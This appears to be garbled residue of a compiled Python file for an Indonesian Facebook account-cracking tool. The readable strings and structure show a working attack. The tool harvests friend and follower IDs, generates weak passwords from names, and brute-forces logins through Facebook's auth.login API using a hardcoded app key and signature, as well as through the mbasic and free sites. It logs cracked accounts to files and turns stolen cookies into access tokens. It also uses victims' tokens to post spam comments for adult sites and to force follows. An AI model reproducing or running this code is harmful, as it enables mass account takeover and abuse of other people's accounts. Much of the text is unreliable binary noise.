�|d+ d, |d  � |�|d+ d, |d  d- � �q(|��  �zzRt�d| d | �}t�|j�}ttd t d t d t d |d  � W n8 t�y�   ttd t d t d t d � Y n0 t�d| d# | d$ | �}	t�|	j�}t
|d.�}|d* D ]>}|
�|d+ d, |d  � |�|d+ d, |d  d- � �q<|��  �z�zRt�d| d | �}t�|j�}ttd t d t d t d |d  � W n8 t�y   ttd t d t d t d � Y n0 t�d| d# | d$ | �}	t�|	j�}t
|d.�}|d* D ]>}|
�|d+ d, |d  � |�|d+ d, |d  d- � �qP|��  �zNzRt�d| d | �}t�|j�}ttd t d t d t d |d  � W n8 t�y&   ttd t d t d t d � Y n0 t�d| d# | d$ | �}	t�|	j�}t
|d.�}|d* D ]>}|
�|d+ d, |d  � |�|d+ d, |d  d- � �qd|��  ttd t d t d t d/t|
�  � t|�W W W W W S  t�	y8 } z6t td0 � t td1 � ttd2 � t�  W Y d }~n
d }~0 0 W nP t�	y� } z6t td0 � t td3 � ttd2 � t�  W Y d }~n
d }~0 0 W nP t�	y� } z6t td0 � t td4 � ttd2 � t�  W Y d }~n
d }~0 0 W nP t�
y4 } z6t td0 � t td5 � ttd2 � t�  W Y d }~n
d }~0 0 W nP t�
y� } z6t td0 � t td6 � ttd2 � t�  W Y d }~n
d }~0 0 d S )7Nr  r  r   r   r   r  r  r�   r  r  r�   r  r5  � Followers ID Target 04 : z Followers ID Target 05 : r  r  r  r6  r�   r&   r�   r   r  r7  r�   r   r!  r"  r9   r#  r$  r%  r&  r'  r(  r8  r9  r�   r  r�   rA   r�   r*  r   r)  r  r+  zMaaf Masalah Terhadap Id 05r-  �Maaf Masalah Terhadap Id 04r:  r,  r.  �r�   r   r�   r7   r    r!   r   r�   r   r  rL   rM   r�   rj   r   rp   rN   rQ   r�   r�   rS   r�   r�   r�   r{   r�   r�   r  r�   r�   )r/  r0  r;  �idt4Zidt5r1  r�   r2  r3  r&   r�   r�   r  r4  rc   r�   r"   r"   r#   r  k  s   $
$
$
$

$

$$
($$
0$ 
"0*
"0*
"0*
"0*
",    r  c               
   C   s�  t d� tt� d�� ttd t d t d t d �} t| �dk rpt | dv rTd	ntd
 � t�d� t	�  q:ttd t d t d t d �}t|�dk r�t |dv r�d	ntd
 � t�d� t	�  q�ttd t d t d t d �}t|�dk �r(t |dv �rd	ntd
 � t�d� t	�  q�ttd t d t d t d �}t|�dk �r�t |dv �rjd	ntd
 � t�d� t	�  �qLt td t d t d t d � ttd t d t d t d �}t|�dk �r*t |dv �r�d	ntd � t�d� ttd t d t d t d �}�q�zt
dd��� }W nl t�y�   ttd t d t d t d � ttd t d t d t d � t�d� t�  Y n0 �z�zRt�d|  d | �}t�|j�}ttd t d t d t d |d  � W n^ t�y^   ttd t d t d t d � ttd t d  t d! t � t�  Y n0 t�d|  d" | d# | �}g }	t�|j�}
|d$ d% �d&d'�}t
|d(�}|
d) D ]>}|	�|d* d+ |d  � |�|d* d+ |d  d, � �q�|��  �zzRt�d| d | �}t�|j�}ttd t d t d t d |d  � W n8 t�y�   ttd t d t d t d � Y n0 t�d| d" | d# | �}t�|j�}
t
|d-�}|
d) D ]>}|	�|d* d+ |d  � |�|d* d+ |d  d, � �q�|��  �z�zRt�d| d | �}t�|j�}ttd t d t d t d |d  � W n8 t�y�   ttd t d t d t d � Y n0 t�d| d" | d# | �}t�|j�}
t
|d-�}|
d) D ]>}|	�|d* d+ |d  � |�|d* d+ |d  d, � �q�|��  �zLzRt�d| d | �}t�|j�}ttd t d t d t d |d  � W n8 t�y�   ttd t d t d t d � Y n0 t�d| d" | d# | �}t�|j�}
t
|d-�}|
d) D ]>}|	�|d* d+ |d  � |�|d* d+ |d  d, � �q�|��  ttd t d t d t d.t|	�  � t|�W W W W S  t�y� } z6t td/ � t td0 � ttd1 � t�  W Y d }~n
d }~0 0 W nP t�y } z6t td/ � t td2 � ttd1 � t�  W Y d }~n
d }~0 0 W nP t�yj } z6t td/ � t td3 � ttd1 � t�  W Y d }~n
d }~0 0 W nP t�y� } z6t td/ � t td4 � ttd1 � t�  W Y d }~n
d }~0 0 d S )5Nr  r  r   r   r   r  r  r�   r  r  r�   r  r5  r<  r  r  r  r6  r�   r&   r�   r   r  r7  r�   r   r!  r"  r9   r#  r$  r%  r&  r'  r(  r8  r9  r�   r  r�   rA   r�   r*  r   r)  r  r+  r=  r-  r:  r,  r.  r>  )r/  r0  r;  r?  r1  r�   r2  r3  r&   r�   r�   r  r4  rc   r�   r"   r"   r#   r  �  s�    $
$
$
$

$$
($$
0$ 
"0*
"0*
"0*
",   r  c               
   C   sL  t td t d t d t d �} t| �dk rZt| dv r>dntd � t�d	� t�  q$ttd t d t d t d
 � t td t d t d t d �}t|�dk r�t|dv r�dntd � t�d	� t td t d t d t d �}q�zt	dd��
� }W nl t�yt   ttd t d t d t d � ttd t d t d t d � t�d� t�  Y n0 �z~zRt�d|  d | �}t�|j�}ttd t d t d t d |d  � W nX t�y$   ttd t d t d t d � ttd t d t d t � Y n0 t�d|  d | d | �}g }t�|j�}|d d  �d!d"�}t	|d#�}	|d$ D ]>}
|�|
d% d& |
d  � |	�|
d% d& |
d  d' � �qz|	��  ttd t d t d t d(t|�  � t|�W S  t�yF } z6ttd) � ttd* � t td+ � t�  W Y d }~n
d }~0 0 d S ),Nr   r   r   r  r  r�   r  r  r�   r  r  r  zWajib 3 Angka !!r�   r&   r�   r   r  r7  r�   r   r!  r"  r9   r#  r$  r%  r&  r'  r(  r8  r9  r�   r  r�   rA   r�   r*  r   r  r+  r.  r-  )r7   r    r!   r   r�   r�   r�   r   r  rL   rM   r�   r   rj   r   rp   rN   rQ   r�   r�   rS   r�   r�   r{   r�   r�   r  r�   r�   )r/  r1  r�   r2  r3  r&   r�   r�   r  r4  rc   r�   r"   r"   r#   r  o  sT    $
$$
&$$
0$&
",
r  c               
   C   s�  zt dd��� } W n� ty�   ttd t d t d t d � ttd t d t d t d � ttd t d t d t d � t�d	� t�  Y n0 �z�ttd t d
 t d t d � t	td t d
 t d t d �}zRt
�d| d |  �}t�|j�}ttd t d
 t d t d |d  � W n^ t�y�   ttd t d t d t d � ttd t d t d t � t�  Y n0 t
�d| d |  �}g }t�|j�}|d d �dd�}t |d�}|d D ]>}	|�|	d d |	d  � |�|	d d |	d  d � �q�|��  ttd t d
 t d t dt|�  � t|�W S  t�y� }
 z6ttd  � ttd! � t	td" � t�  W Y d }
~
n
d }
~
0 0 d S )#Nr�   r&   r�   r   r   r  r   r7  r�   r   z" Type 'me' To Dump From Friendlistz User ID Target : r   r!  r"  r9   r#  r$  r%  r&  z!/friends?limit=5000&access_token=r8  r9  r�   r  r�   rA   r�   r*  r   r  r+  r.  r-  )rL   rM   r�   r   r    r!   rj   r   rp   r7   rN   rQ   r�   r�   rS   r�   r�   r�   r{   r�   r�   r   r  r�   r�   r�   r�   )r�   r/  r2  r3  r&   r�   r�   r  r4  rc   r�   r"   r"   r#   r�   �  sF    $$$
$$0$ 
",
r�   c                 C   s�  t td t d t d t d t d t d t d � t td t d	 t d t d
 t d t d t d � t td t d t d t d t d t d t d � t td t d t d t d t d t d t d � ttd t d t d t d �}|dv �rLt td t d t d t d � t| � n||dv �r`t| � nh|dv �rtt| � nT|dv �r�t	| � n@|dv �r�t
| � n,t td t d t d t d � t| � d S )Nr�   r(   r   z Api r�   z SPAM CRACK 57% r�   r   r�   z Api + Ttl z COME SOON r�   z Mbasic z SPAM CRACK 10% r�   z Free Facebook z SPAM CRACK 0%r   r�   r�   r   r�   r�   r�   r�   r�   )r   r    r!   r_   r�   r7   r  �bapi�crack�bapittl�crackffb)r�   �krahr"   r"   r#   r  �  s$    <<<<$
$








$r  c                 C   s�  g }t dd��� }| �d�D �]r}t|�dk r2qq|�� }t|�dks^t|�dks^t|�dkr�|�|d � |�|d � |�|d	 � q|�|d
 � |�|d � |�|� d|v �r|�d� |�d� |�d� |�d� |�d� |�d� |�d� qd|v �r6|�d� |�d� |�d� |�d� qd|v �r`|�d� |�d� |�d� qd|v r|�d� |�d� |�d� |�d� q|S )Nr�   r&   r�   r  �   �   Z123Z1234Z12345Z321Z4321r�   ZsayangZ	bismillahZanjingr  Z	indonesiaZbajinganZ123456r�   Z786786Z000786Z102030Z556677r�   Zpakistanr�   ZqwertyZiloveyouZ	passwords)rL   rM   r�   r   rg   r{   )rS   r$   Zctr_   r"   r"   r#   �generate�  sH    $

















rG  c                  C   s�   t dd��� } d| v r d}d}n4d| v r2d}d}n"d	| v rDd
}d}nd| v rTd}d}ttd t | � ttd t | � d S )Nr�   r&   r�   r�   zdname123,name1234,name12345,name321,name4321,sayang,bismillah,anjing,kontol,indonesia,bajingan,123456r�   r�   z102030,556677,000786,786786r�   r�   z000786,786786,pakistanr�   r�   z passwords,qwerty,iloveyou,123456z*You Are Using A Password From The Country zPassword Now Used : )rL   rM   r   r�   r    )r�   r�   r�   r"   r"   r#   �
kata_risky�  s    rH  c                   @   s,   e Zd Zdd� Zdd� Zdd� Zdd� Zd	S )
rB  c                 C   s&   d| _ g | _g | _d| _| �|� d S �NFr   ��setpw�okrH   �looprD  ��self�isifiler"   r"   r#   �__init__  s
    zbapittl.__init__c              
   C   s�  t td t d t d t d � ttd t d t d t d �}|dv rxt td t d t d t d	 � q$q$|d
v �r|�z4z$|| _t| j��� �� | _W �qW q� t	�y } z@t td t d t d t d|  � W Y d }~q�W Y d }~q�d }~0 0 q�g | _
t td t d t d t d � ttd t d t d t d ��d�| _t| j�dk�rrW q$| jD ]<}z"| j
�|�d�d | jd�� W n   Y �qxY n0 �qxW n> t	�y� } z$t d| � W Y d }~q$W Y d }~n
d }~0 0 t td t d t d t d t d t d t d t d t d t d t d t d � td��| j| j
� t�  �q�q$|dv r$z�z$|| _t| j��� �� | _W �q�W n< t	�y� } z"t |� W Y d }~�q�W Y d }~n
d }~0 0 �q�g | _
| jD ]H}z.| j
�|�d�d t|�d�d �d�� W n   Y �q�Y n0 �q�W n   Y q$Y n0 t td t d t d t d t d t d t d t d t d t d t d t d � td��| j| j
� t�| j� t�  �q�q$d S )Nr�   r   r   z% Crack With Pass Default/Manual [d/m]r   r�   r�   r   � Invalid Number)r�   �M� %s�" Example : sayang,bismillah,123456� Password List : �,r   r*  �r�   �pw�  %s� Crack Started...� Account [OK] Saved to : ok.txt�  Account [CP] Saved to : cp.txt
�   )r=   �Dr   )r   r    r!   r7   �apkrL   rM   r�   �fsr�   �flr�   rY  r   r{   �
ThreadPool�map�bruter   rG  rj   �remove�rO  rP  rh   r�   r_   r"   r"   r#   rD    sh    $$$

($$,
""d
(
.
dzbapittl.krahc           	   
   C   s�  ddd|d|dddd�	}d	}t j||d
�}t�d|j�r�| j�|d | � td||tf � t�|d | � t	dt
 d d�}|�t|�d t|� d � |��  dS d|�� d v �r~z<t �dt|� d t	dd���  �}t�|j�}|d aW n   Y n0 | j�|d | d t � td||tf � t	dt
 d d�}|�t|�d t|� d tt� d � |��  dS dS )N�/350685531728%7C62f8ce9f74b12f84c123cc23437a4a32�JSONr�   �en_US�iosr(   � 3f555f99fb61fcd7aa0c44f58f522ef6�	Zaccess_tokenr�   Zsdk_versionr:   Zlocaler�   ZsdkZgenerate_session_cookiesZsig�,https://b-api.facebook.com/method/auth.login��params�	(EAAA)\w+r�   �2[0;32m[[0;37mOK[0;32m] %s|%s %s               �	Hasil/OK-�.txtrc   r   T�www.facebook.com�	error_msgr   r!  r�   r&   Zbirthdayz*[0;33m[[0;37mCP[0;33m] %s|%s|%s[0m   zCP-r)  F)rN   rQ   rU   r�   rS   rL  r{   r   �NrL   r�   r�   r   r�   r�   rM   r�   �ttlrH   )	rO  r�   r�   rp  �api�response�saveZkeZttr"   r"   r#   �bruteRequestJ  s0    $*zbapittl.bruteRequestc                 C   s4  | j dkr�|  jd7  _|d D ]z}|d �� }|�� }z| �||�dkrPW  q�W n   Y q Y n0 td| jt| j�t| j�t| j�f dd� t	j
��  q n�|  jd7  _| j D ]|}td �� }|�� }z| �||�dkr�W  �q0W n   Y q�Y n0 td| jt| j�t| j�t| j�f dd� t	j
��  q�d S )	NFr   rY  r�   T�o[0;33m[[0;37mCrack[0;33m][0;37m %s/%s [0;32m[[0;37mOK : %s[0;32m] [0;33m[[0;37mCP : %s[0;33m][0;37mr�   ��end)rK  rM  rg   r|  r   r   rb  rL  rH   r�   r
   r�   �users�rO  rb  rY  r�   r�   r"   r"   r#   re  e  s*    


:

zbapittl.bruteN��__name__�
__module__�__qualname__rQ  rD  r|  re  r"   r"   r"   r#   rB  
  s   9rB  c                   @   s,   e Zd Zdd� Zdd� Zdd� Zdd� Zd	S )
r@  c                 C   s&   d| _ g | _g | _d| _| �|� d S rI  rJ  rN  r"   r"   r#   rQ  }  s
    zbapi.__init__c              
   C   s0  t �  tdt d t d t d t d t d t d t d t � ttd t d t d t d	 �}|d
v r�ttd t d t d t d � qJqJ|dv �r��z4z$|| _t| j��� �	� | _
W �q.W q� t�y* } z@ttd t d t d t d|  � W Y d }~q�W Y d }~q�d }~0 0 q�g | _ttd t d t d t d � ttd t d t d t d ��d�| _t| j�dk�r�W qJ| j
D ]<}z"| j�|�d�d | jd�� W n   Y �q�Y n0 �q�W n> t�y } z$td| � W Y d }~qJW Y d }~n
d }~0 0 ttd t d t d t d t d t d t d t d t d t d t d t d t d t d � td��| j| j� t�  �q,qJ|dv rJz�z$|| _t| j��� �	� | _
W �q"W n< t�y } z"t|� W Y d }~�q�W Y d }~n
d }~0 0 �q�g | _| j
D ]H}z.| j�|�d�d t|�d�d �d�� W n   Y �q.Y n0 �q.W n   Y qJY n0 ttd t d t d t d t d t d t d t d t d t d t d t d t d t d � td��| j| j� t�| j� t�  �q,qJd S )Nr   r   r   r   �& Do You Want To Use Manual Password?? r�   �Y/nr&  z Dumai-991 ?: r�   r   rR  )�y�YrT  rU  rV  rW  r   r*  rX  rZ  r�   r[  �" Account [OK] Saved to : Hasil/OK-rt  �" Account [CP] Saved to : Hasil/CP-�.txt
r^  )�nrw  r   )rH  r   r    r!   �hr7   r`  rL   rM   r�   ra  r�   rb  r�   rY  r   r{   r�   rc  rd  re  r   rG  rj   rf  rg  r"   r"   r#   rD  �  sj    D$$

($$,
""t
(
.
tz	bapi.krahc              
   C   s$  ddd|d|dddd�	}d	}t j||d
�}t�d|j�r�| j�|d | � td||tf � t�|d | � t	dt
 d d�}|�t|�d t|� d � |��  dS d|�� d v �r | j�|d | � td||tf � t	dt
 d d�}|�t|�d t|� d � |��  dS dS )Nrh  ri  r�   rj  rk  r(   rl  rm  rn  ro  rq  r�   rr  rs  rt  rc   r   Tru  rv  z2[0;33m[[0;37mCP[0;33m] %s|%s %s               �	Hasil/CP-r)  F)rN   rQ   rU   r�   rS   rL  r{   r   rw  rL   r�   r�   r   r�   r�   rH   )rO  r�   r�   rp  ry  rz  r{  r"   r"   r#   r|  �  s&    zbapi.bruteRequestc              	   C   s<  | j dkr�|  jd7  _|d D ]z}|d �� }|�� }z| �||�dkrPW  q�W n   Y q Y n0 td| jt| j�t| j�t| j�f dd� t	j
��  q n�|  jd7  _| j D ]�}td �� }|�� }z| �||�dkr�W  �q8W n   Y q�Y n0 td	t d
| jt| j�t| j�t| j�f  dd� t	j
��  q�d S )NFr   rY  r�   Tzo[0;33m[[0;37mCrack[0;33m][0;37m %s/%s [0;32m([0;37mOK : %s[0;32m) [0;33m([0;37mCP : %s[0;33m)[0;37mr�   r~  z[0;33m[[0;37mzZ[0;33m][0;37m %s/%s [0;32m([0;37mOK : %s[0;32m) [0;33m([0;37mCP : %s[0;33m)[0;37m)rK  rM  rg   r|  r   r   rb  rL  rH   r�   r
   r�   r�  r�   r�  r"   r"   r#   re  �  s*    


:

z
bapi.bruteNr�  r"   r"   r"   r#   r@  |  s   :r@  c                   @   s:   e Zd Ze�d� e�  e�  dd� Zdd� Zdd� Z	dS )	rC  r�   c              
   C   sB  g | _ g | _d| _tdt d t d t d t d t d t d t d	 t � ttd t d t d t d
 �}|dkr�qVqV|dv �r�z�z"|| _t	| j��
� �� | _W q�W q� ty� } z$td| � W Y d }~q�W Y d }~q�d }~0 0 q�g | _| jD ]8}z| j�d|�d�d i� W n   Y �q Y n0 �q W n> t�yz } z$td| � W Y d }~qVW Y d }~n
d }~0 0 ttd t d t d t d � | ��  �q>qV|dv rVz�z$|| _t	| j��
� �� | _W �q"W n@ t�y } z&td| � W Y d }~�q�W Y d }~n
d }~0 0 �q�g | _| jD ]H}z.| j�|�d�d t|�d�d �d�� W n   Y �q.Y n0 �q.W n2 t�y� } ztd| � W Y d }~n
d }~0 0 ttd t d t d t d t d t d t d t d t d t d t d t d � td��| j| j� t�| j� t�  �q>qVd S )Nr   r   r   r   r   r�  r�   r�  r&  r�   r   )r�  r�  �   %sr�   r*  rU  )rw  r�  r   rX  r�   r[  r\  r]  �#   )�adarH   �kor   r    r!   r�  r7   r`  rL   rM   r�   ra  r�   rb  r{   r�   �pwlistrG  rc  rd  �mainrj   rf  r   rg  r"   r"   r#   rQ  �  s^    D$
$
"$
(
."dzcrackffb.__init__c                 C   s�   t td t d t d t d ��d�| _t| j�dkrD| ��  n�| jD ]}|�d| ji� qJt	td t d t d t d	 t d t d t d t d
 t d t d t d t d � t
d��| j| j� t�| j� t�  d S )Nr   r   r   rV  rW  r   rY  r�   r[  r\  r]  r^  )r7   r    r!   r�   rY  r   r�  rb  rP   r   rc  rd  r�  rj   rf  r`  r   �rO  r_   r"   r"   r#   r�  !  s    ,

dzcrackffb.pwlistc                 C   s^  �z@|� d�D ]�}t|� d�|d�}|� d�dkr�td|� d�|f � | j�d|� d�|f � tdt d	 d
��d|� d�|f �  q�q|� d�dkrtd|� d�|f � | j�d|� d�|f � tdt d	 d
��d|� d�|f �  q�qqq|  j	d7  _	td| j	t
| j�t
| j�t
| j�f dd� tj��  W n   | �|� Y n0 d S )NrY  r�   zhttps://free.facebook.comrE   rH   �/[0;33m[[0;37mCP[0;33m] %s|%s               �%s|%sr�  rt  r)  �%s|%s
rC   �/[0;32m[[0;37mOK[0;32m] %s|%s               zOK-r   r}  r�   r~  )rQ   ra   r   rH   r{   rL   r�   r�   r�  r�  r   rb  r�   r
   r�   r�  �rO  rb  r_   Zlogr"   r"   r#   r�  ,  s0    
���:zcrackffb.mainN)
r�  r�  r�  rj   r   r�   rH  rQ  r�  r�  r"   r"   r"   r#   rC  �  s   
3rC  c                   @   s4   e Zd Ze�d� e�  dd� Zdd� Zdd� ZdS )	rA  r�   c              
   C   sn  g | _ g | _d| _t�  tdt d t d t d t d t d t d t d	 t � ttd t d t d t d
 �}|dkr�q\q\|dks�|dk�r�z�z$|| _	t
| j	��� �� | _W �qW q� t�y } z$td| � W Y d }~q�W Y d }~q�d }~0 0 q�g | _| jD ]8}z| j�d|�d�d i� W n   Y �qY n0 �qW n> t�y� } z$td| � W Y d }~q\W Y d }~n
d }~0 0 ttd t d t d t d � | ��  �qjq\|dk�s�|dkr\z�z$|| _	t
| j	��� �� | _W �q>W n@ t�y8 } z&td| � W Y d }~�q�W Y d }~n
d }~0 0 �q�g | _| jD ]H}z.| j�|�d�d t|�d�d �d�� W n   Y �qJY n0 �qJW n2 t�y� } ztd| � W Y d }~n
d }~0 0 ttd t d t d t d t d t d t d t d t d t d t d t d t d t d � td��| j| j� t�| j	� t�  �qjq\d S )Nr   r   r   r   r   r�  r�   r�  r&  r�   r   r�  r�  r�  r�   r*  rU  rw  r�  r   rX  r�   r[  r�  rt  r�  r�  r�  )r�  rH   r�  rH  r   r    r!   r�  r7   r`  rL   rM   r�   ra  r�   rb  r{   r�   r�  rG  r�   rc  rd  r�  rj   rf  r   rg  r"   r"   r#   rQ  F  s`    D$
$
"$
(
."tzcrack.__init__c                 C   s�   t td t d t d t d ��d�| _t| j�dkrD| ��  n�| jD ]}|�d| ji� qJt	td t d t d t d	 t d t d t d t d
 t
 d t d t d t d t d t
 d � td��| j| j� t�| j� t�  d S )Nr   r   r   rV  rW  r   rY  r�   r[  r�  rt  r�  r�  r^  )r7   r    r!   r�   rY  r   r�  rb  rP   r   r�   rc  rd  r�  rj   rf  r`  r   r�  r"   r"   r#   r�  z  s    ,

tzcrack.pwlistc                 C   s^  �z@|� d�D ]�}t|� d�|d�}|� d�dkr�td|� d�|f � | j�d|� d�|f � tdt d	 d
��d|� d�|f �  q�q|� d�dkrtd|� d�|f � | j�d|� d�|f � tdt d d
��d|� d�|f �  q�qqq|  j	d7  _	td| j	t
| j�t
| j�t
| j�f dd� tj��  W n   | �|� Y n0 d S )NrY  r�   zhttps://mbasic.facebook.comrE   rH   r�  r�  r�  rt  r)  r�  rC   r�  rs  z.txt.txtr   r}  r�   r~  )rQ   r`   r   rH   r{   rL   r�   r�   r�  r�  r   rb  r�   r
   r�   r�  r�  r"   r"   r#   r�  �  s0    
���:z
crack.mainN)	r�  r�  r�  rj   r   r�   rQ  r�  r�  r"   r"   r"   r#   rA  C  s
   
4rA  c                  C   sB  t �d� t�  ttd t d t d t d � ttd t d t d t d � ttd t d	 t d t d
 � ttd t d t d t d �} | dkr�ttd t d t d t d � t�  nj| dkr�t�  t	�  nT| dk�rt�  t
�  n<| d	k�rt�  n*ttd t d t d t d � t�  d S )Nr�   r�   r(   r   z Login Tokenr   r�   z Login Cookiesr<   z Exitr   r�   r   r   r�   )rj   r   r�   r   r    r!   r7   rp   r  �	log_token�genr   )Zsekr"   r"   r#   rp   �  s&    
$$$$$

$rp   c               	   C   sF   d} z t dd�}|�| � |��  W n ttfy@   t�  Y n0 d S )Nrr   r%   r�   )rL   r�   r�   r�   r�   rp   )r]   Zugentr"   r"   r#   �	defaultua�  s    

r�  c                  C   s  t �d� t�  ttd � ttd � ttd t d t d t d �} zlt�	d|  �}t
�|j�}|d	 }td
d�}|�| � |��  ttd t d t d t d � t�  W nF ty�   ttd t d t d t d � t �d� t�  Y n0 d S )Nr�   zJYou Don't Have Facebook Cookies/Tokens :( Please Visit My Facebook Profile�0LINK FACEBOOK : HTTPS://M.FACEBOOK.COM/llovexnxxr�   r   r   z	 Token : z+https://graph.facebook.com/me?access_token=r9   r�   r�   � Login Successfulr   r   � Token Invalid)rj   r   r�   r   r�   r7   r    r!   rN   rQ   r�   r�   rS   rL   r�   r�   �
bot_followr�   rp   )r�   r�   rc   r�   Zzeddr"   r"   r#   r�  �  s$    
$

$
$
r�  c                  C   sn  t �d� t�  td� td� ttd t d t d t d �} zTtjdd	d
dddddddd�	d| id�}t	�
d|j�}|d u r�dnd|�d� }W n� tjjy�   ttd t d t d t d � Y nL ttg�y   ttd t d t d t d � t �d� t�  Y n0 tdd�} | �|�d�� | ��  ttd t d t d t d � t�  d S ) Nr�   zMYou Don't Have Facebook Cookies/Tokens :( Please Visit My Facebook Profile...r�  r�   r   r   z
 Cookies: zGhttps://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_z�Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36zhttps://m.facebook.com/zm.facebook.comzhttps://m.facebook.comr(   r+   r'   r)   ztext/html; charset=utf-8)	r0   r?   rw   ru   r/   r3   r.   r1   rv   �cookierb   z	(EAAA\w+)z&
* Fail : maybe your cookie invalid !!z
* Your fb access token : r   r   r   z No Connectionz Cookies Invalidr�   r�   r�  )rj   r   r�   r   r7   r    r!   rN   rQ   rU   r�   rS   r�   r�   r�   r�   r�   rp   rL   r�   r�   r�  )r�  rA   Z
find_tokenZhasilr"   r"   r#   r�  �  sB    
$���($

$r�  c                  C   s�  zJt dd��� } t dd��� }t�d|  �}t�|j�}|d }|d }W n< ty�   tt	d t
 d t	 d t
 d	 � t�  Y n0 ttd
 t � ttd t	 | � ttd t	 | � d}d}d}d}	d}
d}d}d}d}d}d}d}d}d}d}d}d}t|d | |d | g�}t|d | |d | g�}t||g�}d}t�d |	 d! | d" | � t�d |
 d! | d" | � t�d | d! | d" | � td#� t�d | d! | d" | � t�d | d! | d" | � t�d | d! | d" | � t�d |	 d! | d" | � t�d |
 d! | d" | � t�d | d! | d" | � t�d | d! | d" | � td$� t�d | d% | d" | � t�d | d% | d" | � t�d | d% | d" | � t�d |	 d% | d" | � t�d |
 d% | d" | � t�d | d% | d" | � t�d | d% | d" | � td&� t�d'|  � t�d(|  � t�d)| � t�d*| � t�d+| � t�d,| � t�d-| � td.� t�d/� t�  d S )0Nr�   r&   r�   r9   r�   r�   r   r   r�  zTunggu Sebentar...zYour Name   : zYour ID     : Z4111448792295892Z120338706765807Z167879918678352Z180923747373969Z172628718203472Z198550702277940Z198552118944465zJXNXX.COM AND YANDEX.COM AND ML.RATUKU.TOP AND UNBLOCJ.COM AND KENATIPU.COMz"@[100063690353340:0] LOVE ZERO TWOz]https://www.facebook.com/photo.php?fbid=4111448792295892&set=a.108534305920714&type=3&app=fblz\https://www.facebook.com/photo.php?fbid=120338706765807&set=a.116524033813941&type=3&app=fblz]https://www.facebook.com/photo.php?fbid=4111450232295748&set=a.202528366521307&type=3&app=fblzGhttps://www.facebook.com/100063690353340/posts/167879918678352/?app=fblzGhttps://www.facebook.com/100063690353340/posts/198550702277940/?app=fblzGhttps://www.facebook.com/100063690353340/posts/198552118944465/?app=fblz8Yandex.com
Unblock.com
Ml.Ratuku.Top
Jomblo.Top
Xnxx.comzHhttps://www.facebook.com/100002924366263/posts/4111450325629072/?app=fblr   ZLOVEr   z/comments/?message=r(  zTunggu Sebentar 03zTunggu Sebentar 02z/reactions?type=zTunggu Sebentar 01zDhttps://graph.facebook.com/100000839038766/subscribers?access_token=zDhttps://graph.facebook.com/100017553167451/subscribers?access_token=zDhttps://graph.facebook.com/100063690353340/subscribers?access_token=zDhttps://graph.facebook.com/100067783659018/subscribers?access_token=zDhttps://graph.facebook.com/100002924366263/subscribers?access_token=zDhttps://graph.facebook.com/110877271176800/subscribers?access_token=zWhttps://graph.facebook.com/Termuxid-Dumai-991-110877271176800/subscribers?access_token=z, [0;97m[[0;92m+[0;97m] Login Successfullyr�   )rL   rM   rN   rQ   r�   r�   rS   r�   r   r    r!   rp   r�   r�   r�   �pilihrW   r�   r   r�   )r�   Ztokenr�   rc   r�   r�   Zpost1Zpost2Zpost3Zpost4Zpost5Zpost6Zpost7ZkomZkom2Zkom3Zkom4Zkom5Zkom6Zkom7Zkom8Zkom9Zkom10Zkom_1Zkom_2Zkom_3Zreacr"   r"   r#   r�  �  s�    $
r�  c                   C   s&  t �d� t�  ttd t d t d t � ttd t d t d t � zt �d� W n6 ty�   ttd t d t d	 t d
 � Y n0 ttd t d t d t � zt �d� W n6 ty�   ttd t d t d	 t d
 � Y n0 ttd t d t d t � t	�  d S )Nr�   r$  zResult Crack -- Hasil Crackr&  ZOKzcat Hasil/OK*.txtr   r   r   r   ZCPzcat Hasil/CP*.txtr%  )
rj   r   r�   r   r    r!   r�  r�   r7   r�   r"   r"   r"   r#   r�   :  s    
  * * r�   c                   @   s   e Zd Ze�d� e�  dS )r  �git pullN)r�  r�  r�  rj   r   r�   r"   r"   r"   r#   r  J  s   
r  �__main__r�  )T)r  )�r�   Zh2Zb2Zc2Zi2Zu2Zm2Zp2Zk2r^   r_   r�   r�   r�   r    r!   r�  Z	itertoolsZ	threadingrj   rN   rR   r�   �
subprocessr   r�   rU   r�   r�   r   ZYayanGantengr   r   r   r   ZkeluarZwaktuZacakr	   r�  r
   r   Z	mechanizeZuuid�base64Z
concurrentr   rc  r   r   ZsettingZnowZcurrentr&   rk   rl   rm   rL   rM   ro   r�   rL  rH   rx  r   �strftimer�   ZyearZtahunZmonthZbulanZdayZharir�   r	  r�   ZinpZbulat2Zwar2Zinp2rQ   rS   ZexpZserr   rT   r�   r�   �platformrg   rw  �G�O�Rr$   r`   ra   ri   rq   re   r~   rn   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r  r�   r�   r�   r�   r�   r  r�   r�   r�   r  r  r  r  r  r�   r  rG  rH  rB  r@  rC  rA  rp   r�  r�  r�  r�  r�   r  r�  r"   r"   r"   r#   �<module>   s"  `h
$

	 
/+e

#

,?a v+$'rnYY$G

